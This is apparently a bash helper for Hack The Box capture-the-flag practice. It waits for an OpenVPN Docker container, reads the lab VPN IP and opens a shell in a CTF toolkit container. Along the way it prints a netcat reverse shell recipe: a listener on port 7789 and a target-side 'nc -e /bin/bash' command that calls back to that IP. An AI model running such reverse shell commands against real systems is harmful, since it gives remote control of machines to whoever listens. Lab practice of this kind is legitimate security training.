#!/usr/bin/env bash
set -eu

while true; do
    openvpn_container=$(docker-compose ps | grep openvpn-hackthebox | grep Up | awk '{print $1}')
    if [ "$openvpn_container" != "" ]; then
        ip=$(docker exec -it $openvpn_container "./show_htb_ip.sh" | sed "s/$(printf '\015')//g" )
        if [ "$ip" != "" ]; then
            break
        fi
    fi
    echo "Waiting for openvpn-hackthebox..."
    sleep 1
done

echo "==========================================="
echo "==========================================="
echo
echo "          Reverse Shell Command"
echo
echo "         Your Side: nc -l -p 7789"
echo "  Box: nc -e /bin/bash ${ip} 7789"
echo
echo "==========================================="
echo "==========================================="
echo

exec docker-compose exec -e HTBIP="$ip" ctfsuite bash
